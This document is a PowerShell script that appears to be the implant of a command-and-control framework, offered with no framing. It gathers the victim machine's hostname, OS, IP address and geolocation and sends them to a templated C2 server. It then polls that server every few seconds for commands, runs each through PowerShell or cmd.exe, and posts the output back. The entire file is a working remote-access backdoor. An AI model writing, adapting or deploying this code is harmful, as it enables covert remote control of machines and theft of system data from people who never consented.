$C2 = "http://{C2_HOST}:{C2_PORT}"

# Agent info
$hostname = $env:COMPUTERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption

# Get IP address with multiple fallback methods
$ip = $null
try {
    # Method 1: Get primary IPv4 address from active network adapters
    $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet*" | Where-Object {$_.IPAddress -notlike "169.254.*" -and $_.IPAddress -notlike "127.*"} | Select-Object -First 1).IPAddress
    if (-not $ip) {
        # Method 2: Get from WiFi adapters if Ethernet fails
        $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi*" | Where-Object {$_.IPAddress -notlike "169.254.*" -and $_.IPAddress -notlike "127.*"} | Select-Object -First 1).IPAddress
    }
    if (-not $ip) {
        # Method 3: Get from any active adapter
        $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "169.254.*" -and $_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "::*"} | Select-Object -First 1).IPAddress
    }
    if (-not $ip) {
        # Method 4: Use ipconfig as last resort
        $ipconfig = ipconfig | Select-String "IPv4 Address" | Select-Object -First 1
        if ($ipconfig) {
            $ip = ($ipconfig -replace ".*: ", "").Trim()
        }
    }
} catch {
    Write-Host "DEBUG: Error in primary IP detection methods: $($_.Exception.Message)"
}

# If still no IP, try alternative methods
if (-not $ip -or $ip -eq "" -or $ip -like "169.254.*" -or $ip -like "127.*") {
    try {
        # Method 5: Get external IP from a reliable service
        $externalIP = Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5
        if ($externalIP -and $externalIP -notlike "169.254.*" -and $externalIP -notlike "127.*") {
            $ip = $externalIP
            Write-Host "DEBUG: Using external IP: $ip"
        }
    } catch {
        Write-Host "DEBUG: Failed to get external IP: $($_.Exception.Message)"
    }
}

# Final validation and fallback
if (-not $ip -or $ip -eq "" -or $ip -like "169.254.*" -or $ip -like "127.*") {
    $ip = "Unknown"
    Write-Host "DEBUG: All IP detection methods failed, setting to Unknown"
} else {
    Write-Host "DEBUG: Successfully detected IP: $ip"
}

# Additional validation before sending
Write-Host "DEBUG: Final IP value: '$ip'"
Write-Host "DEBUG: IP type: $($ip.GetType().Name)"
Write-Host "DEBUG: IP length: $($ip.Length)"
Write-Host "DEBUG: IP contains only digits and dots: $($ip -match '^\d+\.\d+\.\d+\.\d+$')"

# Ensure IP is a valid IPv4 format
if ($ip -match '^\d+\.\d+\.\d+\.\d+$') {
    Write-Host "DEBUG: IP format is valid IPv4"
} else {
    Write-Host "DEBUG: IP format is NOT valid IPv4, attempting to fix..."
    # Try to extract IP from the string if it contains one
    if ($ip -match '\d+\.\d+\.\d+\.\d+') {
        $ip = $matches[0]
        Write-Host "DEBUG: Extracted valid IP from string: $ip"
    } else {
        Write-Host "DEBUG: Could not extract valid IP, keeping as: $ip"
    }
}

# Get geolocation data
try {
    $geoResponse = Invoke-RestMethod -Uri "http://ipapi.co/json" -TimeoutSec 10
    $latitude = $geoResponse.lat
    $longitude = $geoResponse.lon
    $country = $geoResponse.country
    $region = $geoResponse.regionName
    $city = $geoResponse.city
    $timezone = $geoResponse.timezone
    $isp = $geoResponse.isp
} catch {
    $latitude = $null
    $longitude = $null
    $country = $null
    $region = $null
    $city = $null
    $timezone = $null
    $isp = $null
}

# Register with C2
$body = @{
    hostname = $hostname
    os = $os
    ip = $ip
} | ConvertTo-Json

Write-Host "DEBUG: Registration body: $body"
Write-Host "DEBUG: Sending registration to: $C2/register"

try {
    $response = Invoke-RestMethod -Uri "$C2/register" -Method POST -Body $body -ContentType "application/json"
    Write-Host "DEBUG: Registration successful: $response"
} catch {
    Write-Host "DEBUG: Registration failed: $($_.Exception.Message)"
    Write-Host "DEBUG: Response status: $($_.Exception.Response.StatusCode)"
    Write-Host "DEBUG: Response body: $($_.Exception.Response.Body)"
}

# Send geolocation data to C2
if ($latitude -and $longitude) {
    $geoBody = @{
        hostname = $hostname
        ip = $ip
        country = $country
        region = $region
        city = $city
        latitude = $latitude
        longitude = $longitude
        timezone = $timezone
        isp = $isp
    } | ConvertTo-Json
    
    Write-Host "DEBUG: Geolocation body: $geoBody"
    Write-Host "DEBUG: Sending geolocation to: $C2/api/geolocation/$hostname"
    
    try {
        $geoResponse = Invoke-RestMethod -Uri "$C2/api/geolocation/$hostname" -Method POST -Body $geoBody -ContentType "application/json"
        Write-Host "DEBUG: Geolocation update successful: $geoResponse"
    } catch {
        Write-Host "DEBUG: Geolocation update failed: $($_.Exception.Message)"
        # Silently fail if geolocation update fails
    }
} else {
    Write-Host "DEBUG: Skipping geolocation update - missing coordinates"
    Write-Host "DEBUG: Latitude: $latitude, Longitude: $longitude"
}

# Main persistent loop
$lastRegistration = Get-Date
$registrationInterval = 300  # Re-register every 5 minutes

Write-Host "DEBUG: Starting main loop with IP: $ip"
Write-Host "DEBUG: Will re-register every $registrationInterval seconds"

while ($true) {
    try {
        $currentTime = Get-Date
        
        # Re-register periodically to keep IP address current
        if (($currentTime - $lastRegistration).TotalSeconds -ge $registrationInterval) {
            Write-Host "DEBUG: Re-registering agent..."
            $body = @{ hostname = $hostname; os = $os; ip = $ip } | ConvertTo-Json
            Write-Host "DEBUG: Re-registration body: $body"
            
            try {
                $response = Invoke-RestMethod -Uri "$C2/register" -Method POST -Body $body -ContentType "application/json"
                Write-Host "DEBUG: Re-registration successful: $response"
                $lastRegistration = $currentTime
            } catch {
                Write-Host "DEBUG: Re-registration failed: $($_.Exception.Message)"
            }
        }
        
        $cmd = Invoke-RestMethod -Uri "$C2/command/$hostname"
        if ($cmd -ne "") {
            Write-Host "DEBUG: Received command: $cmd"
            
            # Choose shell based on command
            if ($cmd -match "Get-|Invoke-|Select-|Format-|New-|Out-") {
                # Assume it's a PowerShell command
                Write-Host "DEBUG: Executing as PowerShell command"
                $output = powershell.exe -Command $cmd | Out-String
            }
            else {
                # Run in CMD
                Write-Host "DEBUG: Executing as CMD command"
                $output = cmd.exe /c $cmd | Out-String
            }
            
            Write-Host "DEBUG: Command output length: $($output.Length)"
            
            $resultBody = @{ output = $output } | ConvertTo-Json
            Invoke-RestMethod -Uri "$C2/result/$hostname" -Method POST -Body $resultBody -ContentType "application/json"
            Write-Host "DEBUG: Command result sent successfully"
        }
        Start-Sleep -Seconds 3
    }
    catch {
        Write-Host "DEBUG: Error in main loop: $($_.Exception.Message)"
        Start-Sleep -Seconds 3
    }
}
